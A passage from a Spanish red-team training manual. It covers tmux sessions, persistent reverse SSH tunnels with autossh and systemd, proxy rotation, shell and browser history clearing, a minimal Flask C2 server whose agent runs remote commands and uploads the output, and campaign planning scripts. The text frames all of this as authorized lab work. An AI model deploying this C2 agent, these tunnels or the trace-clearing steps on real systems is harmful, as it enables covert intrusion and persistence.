tmux split-window -h -t rt-campaign
tmux split-window -v -t rt-campaign:0.0
tmux select-layout -t rt-campaign tiled
# Ejecutar comando en pane específico
tmux send-keys -t rt-campaign:0.1 'tail -f /var/log/syslog' C-m
tmux attach -t rt-campaign
```

### Scripting de sesiones (archivo `tmux_session.sh`)

```bash
#!/usr/bin/env bash
SESSION="rt-${1:-lab}"
tmux new-session -d -s "$SESSION"
tmux rename-window -t "$SESSION:0" "monitor"
tmux send-keys -t "$SESSION:0" "htop" C-m
tmux split-window -h -t "$SESSION"
tmux send-keys -t "$SESSION:0.1" "bash" C-m
tmux select-layout -t "$SESSION" tiled
echo "Session $SESSION creada. Adjunta con: tmux attach -t $SESSION"
```

---

## screen (alternativa)

```bash
# Crear y nombrar session
screen -S rt-campaign
# Detach: CTRL-A D
# Reattach:
screen -r rt-campaign
# Ejecutar en background
screen -dmS rt-campaign bash -c 'while true; do date; sleep 60; done'
```

---

## Túneles reversos (reverse SSH tunnels) y autossh

### Concepto

Un reverse tunnel permite que una máquina detrás de NAT/Firewall abra una conexión hacia un servidor público (control server) y presente un puerto local en ese servidor para acceso remoto. `autossh` mantiene el túnel vivo reintentando.

### Ejemplo con SSH (manual)

En la máquina víctima (laboratorio controlado), ejecutar:

```bash
ssh -N -R 2222:localhost:22 operador@control.example.com -p 22
# Esto publica el puerto 2222 en control.example.com que redirige a puerto 22 de la víctima
```

En el control server, acceder:

```bash
ssh -p 2222 localhost
# o ssh -p 2222 usuario_victima@localhost
```

### Ejemplo con autossh (persistente)

```bash
autossh -M 0 -N -f -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
    -R 2222:localhost:22 operador@control.example.com -p 22
```

Explicación:

* `-M 0`: deshabilita el puerto monitoring interno si no se desea.
* `-f`: background.
* Opciones `ServerAlive*` para detectar caídas.

### systemd unit para túnel autossh (`/etc/systemd/system/autossh-rt.service`)

```
[Unit]
Description=autossh reverse tunnel (RT)
After=network-online.target

[Service]
User=redteam
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M 0 -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
    -R 2222:localhost:22 operador@control.example.com -p 22
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

## Seguridad del canal

* Limitar únicamente puertos necesarios en el control server y usar `AllowUsers` y `Match` blocks en `sshd_config`.
* Emplear certificados SSH o `authorized_keys` con opciones restrictivas (`from="ip",no-agent-forwarding,no-port-forwarding,command="..."`) para reducir riesgo.
* Considerar uso de VPNs (WireGuard) para túneles persistentes con cifrado moderno cuando sea apropiado.

---

## Persistencia de sesiones y limpieza

* Evitar dejar backdoors permanentes sin autorización. Para pruebas dirigidas, documentar el período de persistencia y eliminar todo al final (`systemctl disable --now`, eliminar claves temporales, eliminar unidades systemd).
* Implementar scripts de limpieza: matar procesos, eliminar claves temporales, restaurar `sshd_config`, borrar logs sensibles si así está acordado en RoE (siempre documentar y guardar evidencia antes de limpiar).
* Ejemplo de script de limpieza parcial:

```bash
#!/usr/bin/env bash
set -e
SYSTEMD_UNIT=autossh-rt.service
sudo systemctl stop "$SYSTEMD_UNIT" || true
sudo systemctl disable "$SYSTEMD_UNIT" || true
# eliminar key temporal
sudo sed -i '/# RT TEMP KEY START/,/# RT TEMP KEY END/d' /home/redteam/.ssh/authorized_keys || true
echo "Limpieza básica completada."
```

---

## Logging y auditoría de sesiones

* Mantener logs de `tmux`/`screen` (logs de comandos importantes) y almacenar copias en un repositorio asegurado para reporte.
* Registrar timestamps de attach/detach (`tmux show-options -g | grep history-limit` y `tmux capture-pane -pS -1000 > /path/logs/pane.log`).
* Habilitar `auditd` o `bash` history centralizada para entornos de laboratorio según acuerdo.

---

## Consideraciones legales y éticas

* No uses túneles o persistencia en sistemas de terceros sin autorización escrita y detallada. Incluso en laboratorios, define límites de tiempo y procedimientos de rollback.
* Las operaciones que afectan la disponibilidad o privacidad de datos deben revisarse con el cliente y el equipo legal.

---

## Checklist rápido

* [ ] Usar tmux/screen con naming convention.
* [ ] Configurar autossh/systemd para túneles persistentes cuando sea necesario.
* [ ] Limitar keys en `authorized_keys` con opciones restrictivas.
* [ ] Registrar attach/detach y capturar panes relevantes.
* [ ] Documentar período de persistencia y realizar limpieza al cierre.

---

# Capítulo 5 — OpSec y anonimato operacional

**Objetivos**

* Comprender principios de OpSec (operational security) aplicables a ejercicios de red team y laboratorios.
* Conocer herramientas y estrategias legítimas para proteger la privacidad y reducir la huella operativa en entornos de prueba controlados.
* Aprender a configurar proxys, VPNs y Tor en un laboratorio y cómo automatizar rotación de proxies controlados.
* Proveer plantillas para limpieza de historial en máquinas de laboratorio (no para ocultar actividades ilegales).
* Reforzar límites éticos y legales: no se deben usar estas técnicas para evadir investigaciones, esconder actividad maliciosa o atacar sistemas sin autorización.

---

## Contexto y advertencia ética-legal

OpSec es la práctica de reducir la información disponible sobre tus actividades y capacidades. En red teaming, se usa para simular actores reales y para proteger al operador y a los activos del laboratorio. **No** utilices estos conocimientos para ocultar actividades ilícitas o para evadir a autoridades. Si una prueba produce hallazgos de alto impacto, suspende actividad y sigue el plan de comunicación acordado. Documenta absolutamente todo: autorizaciones, cronogramas, evidencia y justificativos de cada acción.

---

## Principios básicos de OpSec

1. **Minimizar la superficie de exposición:** usa cuentas separadas para tu trabajo (no tu cuenta personal), entornos aislados y snapshots.
2. **Separación de identidad:** separa identidad real del alias operativo en comunicaciones públicas; evita correlaciones (mismo email, mismos alias).
3. **Principio de mínimo privilegio:** evita permisos innecesarios y usa usuarios específicos para tareas ofensivas.
4. **Trazabilidad controlada:** registra acciones para auditoría en un repositorio privado; no borres evidencia sin acuerdo escrito.
5. **Proporcionalidad y documentación:** cada técnica usada debe estar justificada en el scope y documentada en el reporte.

---

## Herramientas y conceptos (alto nivel)

* **VPNs comerciales/privadas:** cifran el tráfico entre tu máquina y un endpoint. Útiles para proteger enlaces en redes públicas y para centralizar acceso desde ubicaciones controladas.
* **Proxies HTTP/SOCKS:** permiten enrutar tráfico de aplicaciones individuales por canales distintos. En laboratorios, pueden usarse para simular diferentes orígenes de tráfico o probar detección.
* **Tor:** red de anonimato de baja capacidad; apropiada para investigación y anonimato relativo, pero no adecuada para transferencias de alta fiabilidad. En pruebas, usar Tor solo cuando esté dentro de RoE.
* **Chains/Jump hosts y bastion hosts:** permiten centralizar puntos de acceso operativos.
* **Rotación de IPs (controlada):** importante para evaluar detección y bloqueo, pero en entornos controlados: rotar sobre proxies propios o proveedores contratados dentro del alcance.

---

## Configuración básica segura (ejemplos conceptuales)

### VPN (ejemplo de cliente OpenVPN)

* Obtén un servidor VPN privado (controlado por tu equipo) o usa un proveedor confiable.
* Mantén registros de conexión para auditoría cuando lo exija el RoE.
* Configura kill-switch en el cliente para evitar leaks en caso de caída.

Archivo de cliente `client.ovpn` (simplificado):

```
client
dev tun
proto udp
remote vpn.example.com 1194
resolv-retry infinite
nobind
persist-key
persist-tun
<ca>...</ca>
<cert>... </cert>
<key>... </key>
```

En Linux:

```bash
sudo openvpn --config client.ovpn
```

(Usar systemd unit para producción de laboratorio).

### Proxy SOCKS con SSH (tunelización para aplicaciones)

Crear un proxy local via SSH:

```bash
ssh -N -D 1080 usuario@jump.example.com
# En aplicaciones, configurar SOCKS5 proxy en localhost:1080
```

Esto puede usarse para enrutar tráfico de navegador por un salto controlado. No lo uses para evadir leyes.

---

## Rotación de proxies (escenario de laboratorio controlado)

Proveeré un ejemplo de script que **rotará** entre proxies que tú mismo controles (lista propia) para pruebas de detección. Este script **no** facilita la evasión de autoridades; su uso debe estar explícitamente autorizado.

`rotate_proxies.sh`

```bash
#!/usr/bin/env bash
# rotate_proxies.sh — rota proxy para curl/torify en laboratorio
set -euo pipefail
PROXY_LIST="${1:-proxies.txt}"   # archivo con proxies en formato host:port
TIMEOUT="${2:-60}"               # segundos por proxy
USER_AGENT="${USER_AGENT:-Mozilla/5.0 (lab)}"
if [ ! -f "$PROXY_LIST" ]; then
  echo "Crear $PROXY_LIST con proxies controlados (host:port)."
  exit 1
fi

while IFS= read -r proxy; do
  echo "[*] Usando proxy $proxy por ${TIMEOUT}s"
  # Ejemplo simple: probar con curl usando proxy
  curl -sS -x "http://$proxy" -A "$USER_AGENT" https://ifconfig.me || echo "Falla con $proxy"
  sleep "$TIMEOUT"
done < "$PROXY_LIST"
```

`proxies.txt` debe contener líneas como:

```
10.0.0.2:3128
10.0.0.3:3128
```

Estos proxies deben ser parte de la infraestructura que controlas o que esté explícitamente autorizada para las pruebas.

---

## Limpieza de históricos en máquinas de laboratorio (solo en sistemas bajo tu control)

A continuación ejemplos para limpiar históricos locales de navegadores y shells en máquinas bajo tu gestión. **No** use esto para eliminar rastros en sistemas ajenos o para evadir investigaciones.

### Limpieza de Bash history (local y segura)

```bash
# vaciar historial actual y fichero .bash_history
history -c
> ~/.bash_history
# forzar sincronización
sync
```

Documenta que se ha realizado limpieza y por qué (por ejemplo, restauración a un estado acordado en el RoE). Guarda copia de logs relevantes en repositorio seguro antes de limpiar si el RoE lo exige.

### Limpieza de Firefox (perfil local)

Este ejemplo elimina cache y últimas sesiones en un perfil local (ruta de ejemplo). Asegúrate de cerrar Firefox antes.

```bash
FIREFOX_PROFILE="$HOME/.mozilla/firefox/xxxxxxxx.default"
rm -rf "$FIREFOX_PROFILE/sessionstore-backups" "$FIREFOX_PROFILE/cache2" "$FIREFOX_PROFILE/sessions" "$FIREFOX_PROFILE/recovery.jsonlz4"
```

Es preferible en muchos casos crear perfiles temporales para pruebas y destruirlos al terminar, en vez de manipular perfiles de usuario real.

---

## Automatizar con Python: comprobador de entorno de anonimato (controlado)

`check_network_identity.py` — comprueba y registra la IP pública por interfaz/proxy para comparar antes/después en pruebas de laboratorio.

```python
#!/usr/bin/env python3
import requests, time, json, os
LOG='logs/identity.jsonl'
os.makedirs('logs', exist_ok=True)
def get_ip(proxy=None):
    try:
        if proxy:
            r = requests.get('https://ifconfig.me/ip', proxies={'http':proxy,'https':proxy}, timeout=10)
        else:
            r = requests.get('https://ifconfig.me/ip', timeout=10)
        return r.text.strip()
    except Exception as e:
        return f"error:{e}"

proxies = [None, 'http://10.0.0.2:3128']
for p in proxies:
    ip = get_ip(p)
    entry = {'ts': int(time.time()), 'proxy': p, 'ip': ip}
    print(entry)
    with open(LOG,'a') as fh:
        fh.write(json.dumps(entry) + "\n")
    time.sleep(2)
```

Este script es útil para verificar que los canales que configuras están funcionando y para documentar diferencias de identidad durante pruebas.

---

## Manejo de leaks y protección adicional

* Habilita DNS-over-HTTPS (DoH) o usa resolutores controlados si el RoE lo permite, para evitar que resoluciones DNS salgan por canales no previstos.
* Configura kill-switch en el cliente VPN: si el túnel cae, evitar que tráfico se fugue por la conexión directa.
* Evita mezclar conexiones personales y operativas en la misma máquina. Usa VMs dedicadas para cada campaña.

---

## Recomendaciones de mitigación y reportes

* Incluye en el reporte del ejercicio: qué mecanismos de anonimato se emplearon, por qué, y evidencia de su funcionamiento (logs y timestamps).
* En la fase de remediación, sugiere controles para la organización: detección de proxies internos, monitoreo de salidas de red, correlación de atributos de sesión (user agent, TLS fingerprint) y políticas de egress.
* Mantén transparencia con el cliente: el uso de técnicas de ocultamiento debe estar aprobado y documentado.

---

## Checklist rápido

* [ ] Todas las técnicas están dentro del alcance y autorizadas.
* [ ] Proxies / VPNs usadas son controladas o contratadas legalmente.
* [ ] Se documentó cada conexión: timestamps, evidencia, purpose.
* [ ] Antes de limpiar históricos: backup de logs si lo requiere el RoE.
* [ ] No se usa Tor ni canales de anonimato para evadir investigaciones ni atacar sistemas no autorizados.

---

# Capítulo 6 — Infraestructura de laboratorio y C2

**Objetivos**

* Diseñar y desplegar un laboratorio reproducible para ejercicios de red team.
* Entender diferencias entre entornos físicos, virtuales y basados en contenedores.
* Montar un servidor C2 (command & control) básico para fines educativos y de laboratorio.
* Automatizar despliegues con Bash, `docker-compose` y Python.
* Incluir medidas de seguridad, limpieza y recomendaciones éticas/legal para el uso de C2 en pruebas autorizadas.

> **Aviso:** todo el contenido de este capítulo está dirigido exclusivamente a laboratorios controlados o ejercicios con autorización escrita. El diseño y uso de servidores C2 puede ser malicioso fuera de ese contexto; no utilices estas técnicas contra sistemas no autorizados.

---

## Conceptos clave y arquitectura de laboratorio

**Laboratorio**: colección de máquinas (VMs o contenedores) que simulan una red objetivo y un entorno de control. Un laboratorio típico tiene:

* Host de control (operador) con herramientas (Kali, repositorios, scripts).
* Red aislada (host-only, NAT con reglas o VLAN), para evitar fugas.
* Máquinas objetivo (Windows/Linux) con snapshots.
* Infraestructura de apoyo: DNS interno, servidor web, Active Directory simulado si es necesario.

**C2 (Command & Control)**: servidor que recibe conexiones de agentes desplegados en máquinas objetivo y permite enviar comandos, exfiltrar datos o controlar sesiones. En este capítulo se hará un C2 *didáctico y minimalista* — no se pretende replicar capacidades avanzadas de frameworks comerciales.

**Contenedores vs VMs**:

* Contenedores son rápidos y reproducibles (ideal para componentes de laboratorio: servidor C2, web, DNS).
* VMs (VirtualBox/VMware) son mejores para simular endpoints reales (Windows con AD, por ejemplo).
  Combina ambos: VMs para víctimas y contenedores para infraestructura.

---

## Requisitos previos

* Máquina host con Docker y `docker-compose` (o VM con Kali + Docker).
* Snapshot inicial del host o entorno de laboratorio.
* Usuario no-root para operaciones diarias; privilegios sudo para despliegues.

---

## Diseño mínimo de C2 educativo

Este C2 será:

* Basado en HTTP(S) simple (server Flask) para recibir "checkins" y enviar tareas.
* Autenticación por token compartido (en laboratorio solo).
* Capacidad básica: checkin, ejecutar comando (simulado), subir resultado.

**Advertencia**: en entornos reales, un C2 requiere cifrado fuerte, autenticación mutua y mitigaciones contra detección; este ejemplo no es para despliegues reales.

---

## Estructura del proyecto (recomendado)

/lab/
├─ docker-compose.yml
├─ c2/
│  ├─ server.py
│  ├─ requirements.txt
│  └─ config.env
└─ agents/
└─ agent_example.py

---

## `docker-compose.yml` (despliegue rápido)

```yaml
version: '3.8'
services:
  c2:
    build: ./c2
    env_file: ./c2/config.env
    ports:
      - "8080:8080"   # puerto del C2 en host (lab controlado)
    volumes:
      - ./c2/data:/app/data
    restart: unless-stopped
```

`c2/Dockerfile`:

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
CMD ["python", "server.py"]
```

`c2/requirements.txt`:

```
flask
flask-restful
python-dotenv
```

`c2/config.env` (ejemplo):

```
C2_TOKEN=LAB_SHARED_SECRET_TOKEN
C2_PORT=8080
```

---

## Servidor C2 didáctico — `c2/server.py`

```python
from flask import Flask, request, jsonify
import os, json, time, uuid

app = Flask(__name__)
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)
TOKEN = os.getenv("C2_TOKEN","changeme")

# In-memory tasks store (simple)
tasks = {}

@app.route("/checkin", methods=["POST"])
def checkin():
    token = request.headers.get("Authorization","").replace("Bearer ","")
    if token != TOKEN:
        return jsonify({"error":"unauthorized"}), 401
    agent_id = request.json.get("agent_id")
    if not agent_id:
        return jsonify({"error":"missing agent_id"}), 400
    # registrar checkin
    ts = int(time.time())
    with open(f"{DATA_DIR}/agents.log","a") as fh:
        fh.write(json.dumps({"agent":agent_id,"ts":ts})+"\n")
    # devolver tarea si existe
    task = tasks.pop(agent_id, None)
    return jsonify({"task": task})

@app.route("/task/<agent_id>", methods=["POST"])
def add_task(agent_id):
    # operador añade tarea manualmente
    token = request.headers.get("Authorization","").replace("Bearer ","")
    if token != TOKEN:
        return jsonify({"error":"unauthorized"}), 401
    cmd = request.json.get("cmd")
    if not cmd:
        return jsonify({"error":"missing cmd"}), 400
    tasks[agent_id] = {"id":str(uuid.uuid4()), "cmd":cmd}
    return jsonify({"ok":True})

@app.route("/upload/<agent_id>", methods=["POST"])
def upload(agent_id):
    token = request.headers.get("Authorization","").replace("Bearer ","")
    if token != TOKEN:
        return jsonify({"error":"unauthorized"}), 401
    content = request.get_json() or {}
    filename = f"{DATA_DIR}/{agent_id}_{int(time.time())}.json"
    with open(filename,"w") as fh:
        fh.write(json.dumps(content))
    return jsonify({"ok":True})

if __name__ == "__main__":
    port = int(os.getenv("C2_PORT",8080))
    app.run(host="0.0.0.0", port=port)
```

---

## Agente didáctico — `agents/agent_example.py`

```python
#!/usr/bin/env python3
import requests, time, os, uuid, subprocess, json
C2="http://control.lab:8080"
TOKEN=os.environ.get("C2_TOKEN","LAB_SHARED_SECRET_TOKEN")
AGENT_ID=os.environ.get("AGENT_ID", str(uuid.uuid4()))

def checkin():
    r = requests.post(f"{C2}/checkin", headers={"Authorization":f"Bearer {TOKEN}"}, json={"agent_id":AGENT_ID}, timeout=10)
    return r.json()

def report(result):
    requests.post(f"{C2}/upload/{AGENT_ID}", headers={"Authorization":f"Bearer {TOKEN}"}, json=result, timeout=10)

if __name__ == "__main__":
    while True:
        try:
            res = checkin()
            task = res.get("task")
            if task:
                cmd = task.get("cmd")
                # ejecutar comando de forma controlada (en laboratorio)
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                report({"cmd":cmd,"returncode":out.returncode,"stdout":out.stdout,"stderr":out.stderr})
            time.sleep(15)
        except Exception as e:
            report({"error":str(e)})
            time.sleep(30)
```

---

## Despliegue automatizado (Bash)

`deploy_lab.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail
echo "[*] Iniciando despliegue lab..."
docker-compose up -d --build
echo "[*] C2 iniciado en http://localhost:8080 (lab)"
```

---

## Seguridad, aislamiento y limpieza

* **Aislar red**: usa redes Docker internas o `--internal` y evita publicar puertos innecesarios a la red pública. En el ejemplo se publica en el host; en un laboratorio real conviene usar una VPN o puerto accesible solo desde la máquina de control.
* **Tokens y claves**: nunca subas `config.env` a repositorios públicos. Usa `.env` en `.gitignore`.
* **Logs y evidencia**: guarda logs de checkins y uploads en `/c2/data` y versiona solo metadatos, no datos sensibles.
* **Eliminación**: para limpiar todo:

```bash
docker-compose down --volumes --remove-orphans
rm -rf c2/data
```

Documenta cualquier limpieza y respeta acuerdos del RoE.

---

## Escalado y mejoras (sugerencias)

* Añadir TLS (NGINX + certificados) y autenticación mutua para cifrado.
* Usar colas (Redis) para desacoplar tareas y gestionar alta concurrencia.
* Implementar autenticación por certificados en agentes.
* Añadir mecanismos de beaconing con intervalos aleatorios y jitter para simular TTPs reales (en laboratorio controlado).

---

## Recomendaciones de mitigación y detección

* Monitorizar conexiones salientes y patrones de beaconing.
* Detectar tráfico C2 por anomalías en volúmenes y destinos.
* Validar integridad de binarios y procesos en endpoints; usar EDR y correlación de eventos.
* Mantener reglas de egress restrictivas y segmentación.

---

## Checklist de despliegue seguro

* [ ] Entorno aislado (red) configurado.
* [ ] Snapshots de VMs antes del despliegue.
* [ ] Tokens/credenciales almacenados en `.env` fuera del repo.
* [ ] Logging habilitado y respaldado.
* [ ] Procedimiento de limpieza definido y probado.
* [ ] Autorización escrita para pruebas con agentes/C2.

---

# Capítulo 7 — Modelado de amenazas y planificación de campañas

**Objetivos**

* Comprender qué es el modelado de amenazas aplicado a ejercicios de red team.
* Aprender a diseñar objetivos SMART (específicos, medibles, alcanzables, relevantes, temporales) y KPIs operativos que permitan evaluar el éxito de una campaña.
* Definir el alcance, reglas de enfrentamiento (RoE), supuestos y líneas rojas.
* Generar plantillas automatizables (exportables a JSON/CSV) para planificar campañas, registrar tareas y medir KPIs.
* Incluir ejemplos prácticos en Bash y Python para crear, versionar y exportar planes de campaña.

> **Aviso:** El modelado y la ejecución de campañas de red team requieren autorización escrita, documentación legal y acuerdos claros con el cliente. Los ejemplos son para uso en laboratorio o en ejercicios contractuales autorizados.

---

## ¿Qué es el modelado de amenazas en Red Teaming?

El modelado de amenazas es el proceso sistemático de identificar, describir y priorizar las posibles amenazas que pueden afectar los objetivos de la organización, y de diseñar escenarios de ataque que permitan evaluar la postura defensiva frente a esas amenazas. En red teaming, el modelado sirve para transformar riesgos teóricos en escenarios prácticos y reproducibles.

Componentes clave:

* **Activos críticos:** datos, sistemas, procesos o personas que, si se comprometen, impactan al negocio.
* **Adversarios y TTPs:** actores plausibles (externos, internos, competidores) y sus tácticas, técnicas y procedimientos (MITRE ATT&CK).
* **Vectores de ataque:** físicos, redes, aplicaciones, supply chain, social engineering.
* **Controles existentes y supuestos:** detecciones, segmentación, políticas, EDR/AV.
* **Impacto y probabilidad:** para priorizar objetivos.

---

## Diseño de objetivos y KPIs (estructura práctica)

### Objetivos (ejemplo)

* **Objetivo estratégico:** Obtener acceso persistente a la base de datos de clientes (sistema X) en un plazo de 14 días sin causar interrupciones de servicio.
* **Objetivo táctico 1:** Enumerar credenciales expuestas en el entorno de pruebas dentro de las primeras 48 horas.
* **Objetivo táctico 2:** Simular exfiltración de 10 registros de prueba y demostrar la ruta de salida de datos.

### KPIs recomendados

* **KPI de acceso:** % de objetivos alcanzados (por ejemplo, 2/3 sistemas críticos).
* **KPI de tiempo:** Tiempo medio desde reconocimiento hasta acceso inicial (en horas).
* **KPI de persistencia:** Tiempo medio de persistencia logrado antes de detección.
* **KPI de detección:** Número de alertas generadas por la Blue Team durante la campaña.
* **KPI de impacto simulado:** Número/porcentaje de datos sensibles accesibles en pruebas controladas.
* **KPI de remediación:** Tiempo medio para aplicar mitigaciones tras la notificación.

Cada KPI debe tener una definición clara, fórmula de cálculo, fuente de datos (logs, C2, SIEM) y frecuencia de medición.

---

## Metodología para planificar una campaña (pasos prácticos)

1. **Recolección inicial:** inventario de activos y entrevistas con stakeholders.
2. **Modelado:** identificar amenazas plausibles y mapear TTPs a objetivos.
3. **Definición de objetivos SMART y KPIs.**
4. **Scoping y RoE:** acordar lo permitido, excluido y las líneas rojas.
5. **Plan de tareas:** dividir la campaña en sprints (recon, acceso, post-explotación, exfil, cierre).
6. **Preparación técnica:** laboratorio, herramientas, agentes, C2 y backups.
7. **Ejecución controlada:** registrar timelines, eventos y evidencias.
8. **Reporte y transferencia:** detalles técnicos, evidencia, mitigaciones y aprendizajes.
9. **Retrospectiva con Blue Team:** ejercicios de mejora y simulacros.

---

## Plantilla de plan de campaña (estructura de datos)

Campos sugeridos:

* `campaign_id`
* `name`
* `client`
* `start_date`, `end_date`
* `scope` (IPs, dominios, sistemas incluidos/excluidos)
* `rules_of_engagement` (contactos de emergencia, horas de ejecución, líneas rojas)
* `objectives` (lista con descripción, prioridad, owner)
* `kpis` (definición, fórmula, fuente)
* `tasks` (recon, exploit, post-exploit, exfil, cleanup)
* `artifacts` (repositorio de scripts, credenciales test, snapshots)
* `evidence_storage` (ruta segura para logs y capturas)
* `approvals` (firmas digitales o referencias de autorización)

---

## Ejemplo: script Bash para crear una plantilla y exportar CSV/JSON

Guarda como `create_campaign.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
OUTDIR=${1:-campaigns}
mkdir -p "$OUTDIR"
read -p "Nombre campaña: " NAME
read -p "Cliente: " CLIENT
START=$(date -I)
END=""
ID="cmp-$(date +%s)"
SCOPE=$(read -p "Scope (IPs/domains, separados por coma): " tmp && echo "$tmp")
ROE=$(read -p "Resumir Rules of Engagement (archivo o texto): " tmp && echo "$tmp")
cat > "$OUTDIR/$ID.json" <<EOF
{
  "campaign_id":"$ID",
  "name":"$NAME",
  "client":"$CLIENT",
  "start_date":"$START",
  "end_date":"$END",
  "scope":"$SCOPE",
  "rules_of_engagement":"$ROE",
  "objectives": [],
  "kpis": [],
  "tasks": []
}
EOF
echo "Plantilla creada: $OUTDIR/$ID.json"
```

Este script inicializa la campaña; las tareas y KPIs pueden agregarse manualmente o con el script Python siguiente.

---

## Ejemplo Python: gestor de campaña y exportador CSV/JSON

`campaign_manager.py` — funciones para añadir objetivos, KPIs, tareas y exportar:

```python
#!/usr/bin/env python3
import json, csv, os, argparse, datetime, uuid

def load_campaign(path):
    with open(path,'r') as fh:
        return json.load(fh)

def save_campaign(path, data):
    with open(path,'w') as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)

def add_objective(campaign, desc, priority="medium", owner="team"):
    obj = {"id": str(uuid.uuid4()), "desc": desc, "priority": priority, "owner": owner, "status":"todo"}
    campaign.setdefault("objectives",[]).append(obj)
    return obj

def add_kpi(campaign, name, formula, source):
    kpi = {"id": str(uuid.uuid4()), "name": name, "formula": formula, "source": source, "value": None}
    campaign.setdefault("kpis",[]).append(kpi)
    return kpi

def export_kpis_csv(campaign, out):
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    with open(out,'w',newline='', encoding='utf-8') as fh:
        w=csv.writer(fh)
        w.writerow(["id","name","formula","source","value"])
        for k in campaign.get("kpis",[]):
            w.writerow([k["id"], k["name"], k["formula"], k["source"], k.get("value","")])

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("campaign_json")
    parser.add_argument("--add-obj", help="Agregar objetivo")
    parser.add_argument("--add-kpi", nargs=3, metavar=('NAME','FORMULA','SOURCE'), help="Agregar KPI")
    parser.add_argument("--export-kpis", help="Exportar KPIs a CSV")
    args = parser.parse_args()
    c = load_campaign(args.campaign_json)
    changed=False
    if args.add_obj:
        add_objective(c, args.add_obj)
        changed=True
    if args.add_kpi:
        name, formula, source = args.add_kpi
        add_kpi(c, name, formula, source)
        changed=True
    if changed:
        save_campaign(args.campaign_json, c)
        print("Campaign updated.")
    if args.export_kpis:
        export_kpis_csv(c, args.export_kpis)
        print("KPIs exported to", args.export_kpis)
```

Con estos scripts puedes inicializar un plan, agregar objetivos y KPIs, y exportarlos para compartir con stakeholders o para alimentar dashboards.

---

## Medición y fuentes de datos (qué medir y cómo)

* **Logs del C2:** timestamps de checkin, ejecución de comandos, cargas subidas.
* **SIEM/EDR:** número de alertas correlacionadas por hora, tipo de regla que disparó.
* **Network telemetry:** sesiones salientes, volúmenes por IP, fingerprint TLS.
* **Resultados de scanners:** número de servicios vulnerables expuestos, CVSS promedio.
* **Entrevistas y cuestionarios:** confirmar impacto percibido por stakeholders (p. ej. accesibilidad a datos sensibles).

Establece cómo se extraen los datos: scripts que consultan APIs del SIEM, exportadores desde el C2, parsers de logs en Python que normalizan eventos.

---

## Reporte y cierre: KPI-driven story

Al final de la campaña, construye un reporte que responda a:

* ¿Qué objetivos se alcanzaron? (medidos contra KPIs)
* ¿Cuánto tiempo llevó cada fase? (timelines)
* ¿Qué detecciones ocurrieron y cuándo? (evidencia correlacionada)
* Recomendaciones priorizadas según impacto y facilidad de mitigación.
  Incluye anexos con scripts, comandos reproducibles y copias de logs relevantes (resguardando datos sensibles).

---

## Recomendaciones de mitigación (desde la óptica ofensiva)

* Priorizar mitigaciones para los vectores explotados efectivamente.
* Aplicar segmentación y control de egress para limitar exfiltración.
* Reforzar gestión de credenciales y rotación.
* Implementar detección basada en comportamientos (beaconing, I/O inusual).
* Documentar y cerrar las brechas detectadas con tickets y SLA claros.

---

## Checklist rápido para planificar campañas

* [ ] Autorización escrita y firma del cliente.
* [ ] Objetivos SMART definidos.
* [ ] KPIs con fórmula, fuente y frecuencia.
* [ ] Ruled of Engagement detalladas y aprobadas.
* [ ] Infraestructura de laboratorio preparada (snapshots, C2, backups).
* [ ] Scripts y herramientas versionadas en repo privado.
* [ ] Plan de comunicación de incidentes acordado.
* [ ] Procedimiento de limpieza y rollback definido.

---

## Parte II — Reconocimiento pasivo y recolección de información

# Capítulo 8 — OSINT con Kali: fuentes y metodología

**Objetivos**

* Entender las fuentes clave de OSINT aplicables a ejercicios de red team: dominios, certificados, registros públicos, redes sociales, repositorios públicos y leak hunters.
* Aprender una metodología reproducible para recolección de información y priorización de hallazgos.
* Automatizar tareas OSINT comunes con herramientas de Kali y con scripts en Python que usan APIs públicas o scrapers ligeros.
* Incluir prácticas éticas y legales: no almacenar ni explotar datos sensibles sin autorización; respetar términos de servicio y límites de rate limiting.

---

## Introducción y advertencia ética-legal

OSINT (Open Source Intelligence) es la recolección y análisis de información accesible públicamente para construir un mapa del objetivo. Es una fase crítica y de bajo riesgo en una campaña de red team, pero no está exenta de límites: no traspasar autenticación, no exfiltrar datos privados, y no abusar de APIs o servicios. Antes de realizar búsquedas automatizadas, confirma el alcance, las restricciones y los acuerdos contractuales.

---

## Fuentes principales y utilidad

* **DNS y registros públicos:** whois, DNS records (A, AAAA, MX, TXT, SPF, DMARC). Útil para identificar infraestructura y propietarios.
* **Certificados TLS/PKI (crt.sh, Censys):** agrupación de subdominios y certificados expirados.
* **Subdominio / dominio bruteforce y discovery:** amass, subfinder, sublist3r.
* **Wayback / Archive:** waybackurls, web.archive.org para recuperar URLs históricas.
* **Repositorios públicos:** GitHub/GitLab — búsqueda de secretos, credenciales hardcoded, archivos de configuración.
* **Leak hunters / breach databases:** Have I Been Pwned, pastebins, leak forums (usar con cautela y solo dentro de scope).
* **Shodan / Censys:** descubrimiento de activos expuestos por IP/servicio. (Requiere clave API).
* **Redes sociales y perfiles profesionales:** LinkedIn, X (Twitter), Facebook, Instagram — para identificar personas clave, correos, relaciones.
* **Data brokers y registros públicos:** bases de datos comerciales, registros de empresas públicas, registros de dominios.
* **OSINT aggregators en Kali:** theHarvester, recon-ng, SpiderFoot (instalable).

---

## Metodología práctica (workflow reproducible)

1. **Elicitación de alcance:** dominios/organización, rangos de IP providos, exclusiones.
2. **Recolectar dominio y DNS:** whois, dig, subdomain enumeration.
3. **Extender surface con certificados y archive:** crt.sh, waybackurls, gau.
4. **Recolectar endpoints web y parámetros:** crawling y fuzzing automático (ffuf/gobuster).
5. **Buscar artefactos en repos públicos:** GitHub code search y dumps.
6. **Enriquecimiento con Shodan/Censys:** puertos, banners, geolocalización.
7. **Social engineering footprint:** perfiles públicos, roles, correos.
8. **Normalización y clasificación:** deduplicar, priorizar por criticidad, mapear a objetivos de campaña.
